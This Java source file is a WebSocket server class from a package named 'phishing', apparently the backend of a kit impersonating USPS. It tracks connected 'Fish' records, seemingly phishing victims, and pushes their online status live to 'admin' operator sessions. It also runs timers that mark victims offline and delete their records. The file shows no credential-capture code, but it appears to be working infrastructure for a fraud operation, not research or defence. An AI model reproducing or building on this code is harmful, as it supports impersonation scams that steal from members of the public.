package com.uspsassa.phishing.socket;

import cn.hutool.core.convert.Convert;
import cn.hutool.extra.spring.SpringUtil;
import com.uspsassa.phishing.common.sresukt.SResult;
import com.uspsassa.phishing.common.sresukt.SResultCode;
import com.uspsassa.phishing.entity.Fish;
import com.uspsassa.phishing.service.FishService;
import com.uspsassa.phishing.timer.UserDeleteTimer;
import com.uspsassa.phishing.timer.UserOnlineTimer;
import com.uspsassa.phishing.vo.FishVo;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Component;
import org.springframework.stereotype.Service;

import javax.websocket.*;
import javax.websocket.server.PathParam;
import javax.websocket.server.ServerEndpoint;
import java.io.IOException;
import java.util.Objects;
import java.util.Timer;
import java.util.concurrent.CopyOnWriteArraySet;

@Component
@Slf4j
@Service
@ServerEndpoint(value = "/api/websocket/{type}/{sid}",encoders = ServerEncoder.class)
public class WebSocketServer {
    //静态变量，用来记录当前在线连接数。应该把它设计成线程安全的。
    private static int onlineCount = 0;
    //concurrent包的线程安全Set，用来存放每个客户端对应的MyWebSocket对象。
    private static CopyOnWriteArraySet<WebSocketServer> webSocketSet = new CopyOnWriteArraySet<WebSocketServer>();

    //与某个客户端的连接会话，需要通过它来给客户端发送数据
    public Session session;
    //接收sid
    public String sid = "";
    public String type = "";
    public Boolean isLogin=false;
    public UserOnlineTimer userOnlineTimer ;
    public UserDeleteTimer deleteFishTimer ;
    /**
     * 连接建立成功调用的方法
     */
    @OnOpen
    public void onOpen(Session session, @PathParam("sid") String sid,@PathParam("type") String type) throws IOException {
        //Socket对象是否已存在
        WebSocketServer isExist = null;
        //判断是否已经存在
        if(!"admin".equals(type)){
            log.info("用户上线");
            for (WebSocketServer item : webSocketSet) {
                if (item.sid.equals(sid)) {
                    isExist = item;
                    break;
                }
            }
            //如果不存在
            if (isExist==null) {
                this.session = session;
                //加入set中
                webSocketSet.add(this);
                //在线数加
                addOnlineCount();
                //接收sid
                this.sid = sid;
                this.type = type;
                this.isLogin = true;
                //用户上线
                log.info("新增一个用户");
            }
            else {
                //用户已存在
                log.info("用户存在 重连操作");
                //取消原来的所有定时任务-
                if (isExist.userOnlineTimer!=null){
                    log.info("取消定时修改信息离线状态任务");
                    isExist.userOnlineTimer.cancel();
                    isExist.userOnlineTimer = null;
                    //修改数据库
                }
                if (isExist.deleteFishTimer!=null){
                    log.info("取消定时删除信息任务");
                    isExist.deleteFishTimer.cancel();
                    isExist.deleteFishTimer = null;
                    //发送信息给所有管理员
                    Fish fish = new Fish();
                    fish.setSid(sid);
                    Fish oneByAll = SpringUtil.getBean(FishService.class).findOneByAll(fish);
                    if (oneByAll!=null){
                        FishVo fishVo = Convert.convert(FishVo.class, oneByAll);
                        fishVo.setIsOnline(true);
                        WebSocketServer.sendAllAdmin(SResult.success(SResultCode.ONLINE,fishVo));
                    }
                }
                //删掉原来的
                webSocketSet.remove(isExist);
                //加入set中
                webSocketSet.add(this);
                //接收sid
                this.sid = sid;
                this.type = type;
                this.isLogin = true;
                this.session=session;
                //用户上线
            }
        }
        if ("admin".equals(type)){
            log.info("管理员上线");
            this.session = session;
            //加入set中
            webSocketSet.add(this);
            //在线数加
            addOnlineCount();
            //接收sid
            this.sid = sid;
            this.type = type;
            this.isLogin = true;
            //用户上线
            log.info("新增一个用户");
        }
    }

    /**
     * 连接关闭调用的方法
     */
    @OnClose
    public void onClose() {
        if ("admin".equals(this.type)){
            log.info("管理员下线");
            //从set中删除
            webSocketSet.remove(this);
            //在线数减
            subOnlineCount();
            //用户下线
            log.info("管理员下线");
            return;
        }else{
            //断开 isLogin = false;
            Timer timer = new Timer();
            //用户离线 开启定时
            log.info("用户离线 开启定时");
            //定时器 传入sid
            this.userOnlineTimer = new UserOnlineTimer(this);
            timer.schedule(this.userOnlineTimer, 1000*10);
        }
    }


    /**
     * @ Param session
     * @ Param error
     */
    @OnError
    public void onError(Session session, Throwable error) {
        log.error("发生错误");
        error.printStackTrace();
    }

    /**
     * 实现服务器主动推送
     */
    public void sendMessage(Object message) throws IOException, EncodeException {
        this.session.getBasicRemote().sendObject(message);
    }

    /**
     * 指定id发送
     */
    public static void sendInfo(Object message, String sid) throws IOException {
        log.info("推送消息到窗口" + sid + "，推送内容:" + message);
        for (WebSocketServer item : webSocketSet) {
            try {
                //这里可以设定只推送给这个sid的，为null则全部推送
                if (item.sid.equals(sid)) {
                    item.sendMessage(message);
                }
            } catch (IOException | EncodeException e) {
                e.printStackTrace();
                continue;
            }
        }
    }

    /**
     * 指定所有管理员发送
     * @return
     */
    public static void sendAllAdmin(Object message) throws IOException {
        log.info("推送消息到所有管理员，推送内容:" + message);
        for (WebSocketServer item : webSocketSet) {
            try {
                //这里可以设定只推送给这个sid的，为null则全部推送
                if ("admin".equals(item.type)) {
                    item.sendMessage(message);
                }
            } catch (IOException | EncodeException e) {
                continue;
            }
        }
    }

    public static synchronized int getOnlineCount() {
        return onlineCount;
    }

    public static synchronized void addOnlineCount() {
        WebSocketServer.onlineCount++;
    }

    public static synchronized void subOnlineCount() {
        WebSocketServer.onlineCount--;
    }

    public static CopyOnWriteArraySet<WebSocketServer> getWebSocketSet() {
        return webSocketSet;
    }
}
